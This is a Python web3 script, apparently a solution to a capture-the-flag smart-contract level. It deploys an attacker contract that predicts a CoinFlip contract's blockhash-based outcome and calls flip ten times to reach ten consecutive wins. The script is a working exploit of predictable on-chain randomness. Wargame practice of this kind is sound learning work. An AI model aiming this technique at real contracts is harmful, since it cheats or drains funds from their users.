from web3 import Web3
from solcx import compile_source
from dotenv import dotenv_values
import time

# 풀이
# 1. CoinFlip 컨트랙트를 외부에서 동일한 Random Seed 번호를 이용하여 호출하는 컨트랙트 생성
# 2. 생성한 컨트랙트로 네트워크의 동일한 블록 번호를 활용한 데이터를 CoinFlip 컨트랙트의 flip 함수에 전달
# 3. 전달한 데이터로 동전 앞/뒤 정보를 전달하여 10회 검사 통과하기 

ENV_PATH = "../.env"

dict_output = dotenv_values(ENV_PATH)

RPC_URI = dict_output['WEB3_PROVIDER_URI']

CONTRACT_ADDRESS = '0x94099942864EA81cCF197E9D71ac53310b1468D8'
PRIVATE_KEY = '0x' + dict_output['USER_ADDRESS_PRIVATE_KEY']

web3 = Web3(Web3.HTTPProvider(RPC_URI))

PA = web3.eth.account.from_key(PRIVATE_KEY)
USER_ADDRESS = PA.address

CONTRACT_ABI = [
    {
        "type": "constructor",
        "inputs": [],
        "stateMutability": "nonpayable"
    },
    {
        "type": "function",
        "name": "consecutiveWins",
        "inputs": [],
        "outputs": [
            {
                "name": "",
                "type": "uint256",
                "internalType": "uint256"
            }
        ],
        "stateMutability": "view",
        "constant": True,
        "signature": "0xe6f334d7"
    },
    {
        "type": "function",
        "name": "flip",
        "inputs": [
            {
                "name": "_guess",
                "type": "bool",
                "internalType": "bool"
            }
        ],
        "outputs": [
            {
                "name": "",
                "type": "bool",
                "internalType": "bool"
            }
        ],
        "stateMutability": "nonpayable",
        "signature": "0x1d263f67"
    }
]

with open("./contract/CoinFlipAttack.sol", "r") as f:
    ATTACKER_SRC_DATA = f.read()

COMPILED_SOL = compile_source(ATTACKER_SRC_DATA, output_values=['abi', 'bin'])

contract_id, contract_interface = COMPILED_SOL.popitem()

ATTACKER_BYTECODE = contract_interface['bin']
ATTACKER_ABI = contract_interface['abi']

contract = web3.eth.contract(address=CONTRACT_ADDRESS, abi=CONTRACT_ABI)
attacker = web3.eth.contract(abi=ATTACKER_ABI, bytecode=ATTACKER_BYTECODE)

# Attacker 컨트랙트 사전 배포
tx_hash = attacker.constructor(CONTRACT_ADDRESS).transact()

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {receipt}\n")

ATTACKER_ADDRESS = receipt.contractAddress

# Attacker 컨트랙트 주소 연결
attacker = web3.eth.contract(address=receipt.contractAddress, abi=ATTACKER_ABI)

print("---- BEFORE TRANSACTION ----")

TOTAL_WINS = contract.functions.consecutiveWins().call()

print(f"Current Total Wins : {TOTAL_WINS}\n")

for _ in range(10):
  BASE_FEE = web3.eth.get_block('pending')['baseFeePerGas']
  PRIORITY_FEE = int(BASE_FEE * 0.15 // 1)
  CURRENT_NONCE = web3.eth.get_transaction_count(USER_ADDRESS)

  # flip 함수 호출하여 동전 면 맞추기
  data = {
      'from': USER_ADDRESS,
      'value': 0,
      'gas': web3.to_wei("0.000000000001", 'ether'),
      'maxPriorityFeePerGas': PRIORITY_FEE,
      'maxFeePerGas': BASE_FEE + PRIORITY_FEE,
      'nonce': CURRENT_NONCE,
  }

  # 트랜젝션 서명 및 전송
  tx = attacker.functions.flip().build_transaction(data)
  signed_tx = web3.eth.account.sign_transaction(tx, PRIVATE_KEY)
  tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

  # 트랜잭션 결과 확인
  tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
  
  TOTAL_WINS = contract.functions.consecutiveWins().call()
  print(f"Current Total Wins: {TOTAL_WINS}")

if TOTAL_WINS >= 10:
    print("Attack Successful!")